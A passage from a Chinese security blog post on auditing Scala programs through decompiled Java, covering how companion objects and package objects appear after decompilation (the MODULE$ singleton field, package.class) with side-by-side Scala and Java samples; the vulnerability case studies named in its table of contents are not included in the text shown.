<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Scala代码审计之痛 -- Scala与Java的爱恨情仇 | 天工实验室</title>
<meta name="keywords" content="Scala, Java">
<meta name="description" content="一、前言
Scala 是一门多范式的编程语言，集成了面向对象编程和函数式编程的多种特性。函数式编程抽象的理论基础也让这门语言变得抽象起来，初学者需要花更多的时间去理解其特有概念以及众多的语法糖。Scala是一门运行在JVM平台上的语言，其源码编译结果符合Java字节码规范，所以可以被反编译为Java代码。在进行Scala代码审计的过程中，审计者很少有机会直面其源码，大多数时候都是被反编译为Java的代码所支配。Scala与Java毕竟是两门语言，反编译成Java代码的后果便是丧失了动态调试的能力（这为审计者带来了不小的麻烦），反编译后产生的中间代码、临时变量等辅助结构更是极大得降低了代码的可读性。本文将带领诸位抽丝剥茧逐步梳理出Scala各语法结构与Java语法结构对应关系，最后以两个漏洞案例的分析加以对比说明。">
<meta name="author" content="hejixiong">
<link rel="canonical" href="http://localhost:1313/blog/scala-java/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/blog/scala-java/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
                    height="100" style="margin-top: 15px;">
            </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://poc.qianxin.com/home" title="破壳官网">
                    <span>破壳官网</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">博客</a></div>
    <h1 class="post-title entry-hint-parent">
      Scala代码审计之痛 -- Scala与Java的爱恨情仇
    </h1>
    <div class="post-meta"><span title='2024-08-11 14:45:33 +0800 CST'>2024年08月11日</span>&nbsp;·&nbsp;16 分钟&nbsp;·&nbsp;hejixiong

</div>
  </header>

  <div class="author">
    <div class="author_avatar">
      <img src="https://tiangonglab.github.io/img/authors/falc0n_leo.jpg" alt="hejixiong">
    </div>
    <div class="author_info">
      <span class="author_id">hejixiong</span>
      <p class="author_description">天工实验室非著名安全研究员、金融圈韭菜、互联网民工、垃圾话爱好者、老实人本人，研究领域：代码审计、Web安全。</p>
    </div>
  </div>
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/scala/">Scala</a></li>
      <li><a href="http://localhost:1313/tags/java/">Java</a></li>
    </ul><br/> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e4%b8%80%e5%89%8d%e8%a8%80" aria-label="一、前言">一、前言</a></li>
                <li>
                    <a href="#%e4%ba%8c%e7%89%b9%e6%ae%8a%e8%af%ad%e6%b3%95%e7%bb%93%e6%9e%84%e8%af%86%e5%88%ab" aria-label="二、特殊语法结构识别">二、特殊语法结构识别</a><ul>
                        
                <li>
                    <a href="#21-%e4%bc%b4%e7%94%9f%e5%af%b9%e8%b1%a1" aria-label="2.1 伴生对象">2.1 伴生对象</a></li>
                <li>
                    <a href="#22-%e5%8c%85%e5%af%b9%e8%b1%a1" aria-label="2.2 包对象">2.2 包对象</a></li>
                <li>
                    <a href="#23-%e5%88%9d%e5%a7%8b%e5%8c%96%e4%bb%a3%e7%a0%81" aria-label="2.3 初始化代码">2.3 初始化代码</a></li>
                <li>
                    <a href="#24-%e4%bc%a0%e5%8f%82%e5%8c%bf%e5%90%8d%e7%b1%bb" aria-label="2.4 传参匿名类">2.4 传参匿名类</a></li>
                <li>
                    <a href="#25-%e7%b1%bb%e5%b5%8c%e5%a5%97" aria-label="2.5 类嵌套">2.5 类嵌套</a></li>
                <li>
                    <a href="#26-%e9%9a%90%e5%bc%8f%e8%bd%ac%e6%8d%a2" aria-label="2.6 隐式转换">2.6 隐式转换</a><ul>
                        
                <li>
                    <a href="#261-%e9%9a%90%e5%bc%8f%e5%87%bd%e6%95%b0" aria-label="2.6.1 隐式函数">2.6.1 隐式函数</a></li>
                <li>
                    <a href="#262-%e9%9a%90%e5%bc%8f%e5%8f%82%e6%95%b0" aria-label="2.6.2 隐式参数">2.6.2 隐式参数</a></li>
                <li>
                    <a href="#263-%e9%9a%90%e5%bc%8f%e7%b1%bb" aria-label="2.6.3 隐式类">2.6.3 隐式类</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e4%b8%89%e6%a1%88%e4%be%8b%e5%88%86%e6%9e%90" aria-label="三、案例分析">三、案例分析</a><ul>
                        
                <li>
                    <a href="#31-apache-spark-ui-%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5cve-2022-33891" aria-label="3.1 Apache Spark UI 远程命令注入（CVE-2022-33891）">3.1 Apache Spark UI 远程命令注入（CVE-2022-33891）</a></li>
                <li>
                    <a href="#32-lazylist%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9ecve-2022-36944" aria-label="3.2 LazyList反序列化漏洞（CVE-2022-36944）">3.2 LazyList反序列化漏洞（CVE-2022-36944）</a><ul>
                        
                <li>
                    <a href="#321-lazylist%e5%ad%98%e5%82%a8%e4%b8%8e%e6%b1%82%e5%80%bc%e5%8e%9f%e7%90%86" aria-label="3.2.1 LazyList存储与求值原理">3.2.1 LazyList存储与求值原理</a></li>
                <li>
                    <a href="#322-lazylist%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8e%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="3.2.2 LazyList序列化与反序列化">3.2.2 LazyList序列化与反序列化</a></li>
                <li>
                    <a href="#323-lazylist%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" aria-label="3.2.3 LazyList反序列化漏洞成因">3.2.3 LazyList反序列化漏洞成因</a></li>
                <li>
                    <a href="#324-lazylist%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="3.2.4 LazyList反序列化漏洞利用">3.2.4 LazyList反序列化漏洞利用</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%9b%9b%e6%80%bb%e7%bb%93" aria-label="四、总结">四、总结</a></li>
                <li>
                    <a href="#%e4%ba%94%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" aria-label="五、参考链接">五、参考链接</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="一前言">一、前言<a hidden class="anchor" aria-hidden="true" href="#一前言">#</a></h2>
<p>Scala 是一门多范式的编程语言，集成了面向对象编程和函数式编程的多种特性。函数式编程抽象的理论基础也让这门语言变得抽象起来，初学者需要花更多的时间去理解其特有概念以及众多的语法糖。<code>Scala</code>是一门运行在<code>JVM</code>平台上的语言，其源码编译结果符合<code>Java</code>字节码规范，所以可以被反编译为<code>Java</code>代码。在进行<code>Scala</code>代码审计的过程中，审计者很少有机会直面其源码，大多数时候都是被反编译为<code>Java</code>的代码所支配。<code>Scala</code>与<code>Java</code>毕竟是两门语言，反编译成<code>Java</code>代码的后果便是丧失了动态调试的能力（这为审计者带来了不小的麻烦），反编译后产生的中间代码、临时变量等辅助结构更是极大得降低了代码的可读性。本文将带领诸位抽丝剥茧逐步梳理出<code>Scala</code>各语法结构与<code>Java</code>语法结构对应关系，最后以两个漏洞案例的分析加以对比说明。</p>
<h2 id="二特殊语法结构识别">二、特殊语法结构识别<a hidden class="anchor" aria-hidden="true" href="#二特殊语法结构识别">#</a></h2>
<p>除了循环、条件判断、面向对象等基础语法外，<code>Scala</code>还提供了极具特色的语法结构，如：模式匹配、隐式转换、传名调用、函数柯里化、伴生对象、特质、提取器、函数式编程等。本章不会重点着墨于这些语法的介绍，而是向读者展示在将<code>Scala</code>源程序反编译为<code>Java</code>代码后产生的那些不太常规的语法结构以及一些奇怪的变量（MODULE$/$outer/package/$init$）等。</p>
<h3 id="21-伴生对象">2.1 伴生对象<a hidden class="anchor" aria-hidden="true" href="#21-伴生对象">#</a></h3>
<blockquote>
<p>本节将会涉及到特殊变量<code>MODULE$</code>的含义</p>
</blockquote>
<p>Scala中没有static关键字，其通过伴生对象来实现static的效果。伴生对象是类自身定义的单个实例，可以被理解为当前类的一个单例对象（并不显式依赖一个类，可独立存在），以下代码展示了一个类的伴生对象：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Singletons</span><span style="color:#f92672">(){</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">var</span> llac<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;九敏啊，我是伴生类的私有属性，我被伴生对象调用了&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> callSingleField<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 调用伴生对象的私有属性
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    println<span style="color:#f92672">(</span><span style="color:#a6e22e">Singletons</span><span style="color:#f92672">.</span>call<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">Singletons</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">var</span> call<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> sayHello<span style="color:#f92672">(</span>llac<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    println<span style="color:#f92672">(</span>llac<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> s<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Singletons</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Singletons</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 调用伴生类的私有属性
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    sayHello<span style="color:#f92672">(</span>s<span style="color:#f92672">.</span>llac<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 调用伴生类的私有方法
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    s<span style="color:#f92672">.</span>callSingleField<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在上面提供的代码中，被关键字<code>object</code>修饰的对象被称为类<code>Singletons</code>的伴生对象，类<code>Singletons</code>被称为<code>object</code>关键字修饰的对象的伴生类，两者可互相调用其私有属性以及方法。</p>
<p><code>Scala</code>语言是运行在<code>jvm</code>上的，其最终编译结果符合<code>Java</code>字节码规范，于是便可以将其反编译成为<code>Java</code>代码进行查看，这样会得到与<code>Scala</code>源代码迥然不同的代码结构，并产生一些中间代码。审计者在进行<code>Scala</code>代码审计时大多数时候面对的都是被反编译成为<code>Java</code>代码的<code>Scala</code>程序，所以如何快速高效地识别<code>Scala</code>代码转换后的语言结构就尤为重要，特别是一些特殊的变量。</p>
<p>以下便是上文<code>Scala</code>源代码反编译成为<code>Java</code>代码后的形态：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.Predef.;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Singletons</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> String org$example$Singletons$$llac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;九敏啊，我是伴生类的私有属性，我被伴生对象调用了&#34;</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      Singletons$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">main</span>(args);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sayHello</span>(<span style="color:#66d9ef">final</span> String llac) {
</span></span><span style="display:flex;"><span>      Singletons$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">sayHello</span>(llac);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">org$example$Singletons$$llac</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$llac</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">org$example$Singletons$$llac_$eq</span>(<span style="color:#66d9ef">final</span> String x$1) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$llac</span> <span style="color:#f92672">=</span> x$1;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">org$example$Singletons$$callSingleField</span>() {
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(Singletons$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">org$example$Singletons$$call</span>());
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from Singletons$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.Predef.;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Singletons$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Singletons$ MODULE$;
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> String org$example$Singletons$$call;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> Singletons$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">org$example$Singletons$$call</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$call</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">org$example$Singletons$$call_$eq</span>(<span style="color:#66d9ef">final</span> String x$1) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$call</span> <span style="color:#f92672">=</span> x$1;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sayHello</span>(<span style="color:#66d9ef">final</span> String llac) {
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">println</span>(llac);
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      Singletons s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Singletons();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sayHello</span>(s.<span style="color:#a6e22e">org$example$Singletons$$llac</span>());
</span></span><span style="display:flex;"><span>      s.<span style="color:#a6e22e">org$example$Singletons$$callSingleField</span>();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">Singletons$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$call</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在反编译后的代码中，注解<code>@ScalaSignature</code>保存了<code>Scala</code>类的签名信息，包括类的类型参数、构造函数参数类型和返回类型等信息，这些信息对于代码审计并不会产生影响，直接无视即可。</p>
<p>在反编译后的代码中，产生了两个特殊的中间变量<code>MODULE$</code> 以及 <code>.MODULE$</code>，本节将介绍<code>MODULE$</code>变量，<code>.MODULE$</code>将在下节与包对象一同引出。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#a6e22e">Singletons$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">org$example$Singletons$$call</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;九敏啊，我是伴生对象的私有属性， 我被伴生类调用了&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span></code></pre></div><p>在伴生对象的私有构造方法中<code>MODULE$</code>被赋值为<code>this</code>，在<code>Java</code>中<code>this</code>表示当前对象实例的引用，即<code>this</code>乃<code>Singletons$</code>单例对象的引用。伴生对象被称为伴生类的单例对象乃是通过静态代码块的方式实现。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> Singletons$();
</span></span><span style="display:flex;"><span>   }
</span></span></code></pre></div><p>根据<code>jvm</code>类加载的原理（加载-&gt;链接-&gt;初始化），在类初始化阶段 &lt;clinit&gt;()方法执行时静态代码块中的代码被执行，也就是说这部分代码在<code>jvm</code>的一次运行周期中只会被执行一次，即实现了单例对象的生成。</p>
<h3 id="22-包对象">2.2 包对象<a hidden class="anchor" aria-hidden="true" href="#22-包对象">#</a></h3>
<blockquote>
<p>本节将介绍<code>.MODULE$</code>的含义</p>
</blockquote>
<p>包对象允许在一个包中定义公共的方法、常量以及类型别名，以便在该包的所有 <code>Scala</code> 文件中共享和访问这些成员。如果你在使用<code>IDEA</code>进行审计时发现某个方法不能正常跳转，请到当前类的包目录下找到名为<code>package.class</code>的文件并尝试在其中找到该方法定义。</p>
<p>首先在<code>org.example</code>包下定义包对象：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">package</span> object example <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> greetExample<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">s&#34;你好, 我是org.example包!&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>然后在其子包<code>org.example.subPackage</code>中定义另一个包对象</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">package</span> object subPackage <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> greetTest<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">s&#34;你好, 我是org.example.subPackage包!&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>接着在<code>org.example</code>包下定义类<code>PackageObject</code>，该类定义了一个方法<code>packageGreet</code>分别从上述两处调用共享方法<code>greetExample</code>以及<code>greetTest</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> subPackage.greetTest
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PackageObject</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> packageGreet<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    greetExample<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    greetTest<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>以<code>org.example</code>下的包对象为例。在定义该包对象时使用了<code>object</code>关键字修饰，可知包对象是伴生对象，在进行代码编译时会自动生成一个与之相关的伴生类，这也就是下面的代码中多出 <code>package</code> 类的原因。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">//decompiled from package.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> scala.reflect.ScalaSignature;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ScalaSignature</span>(
</span></span><span style="display:flex;"><span>   bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ignored&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">package</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">greetExample</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> package$.<span style="color:#a6e22e">MODULE$</span>.<span style="color:#a6e22e">greetExample</span>();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//decompiled from package$.class</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">package$</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> package$ MODULE$;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">static</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">new</span> package$();
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">greetExample</span>() {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;你好, 我是org.example包对象!&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">package$</span>() {
</span></span><span style="display:flex;"><span>      MODULE$ <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>PackageObject.class</code></p>
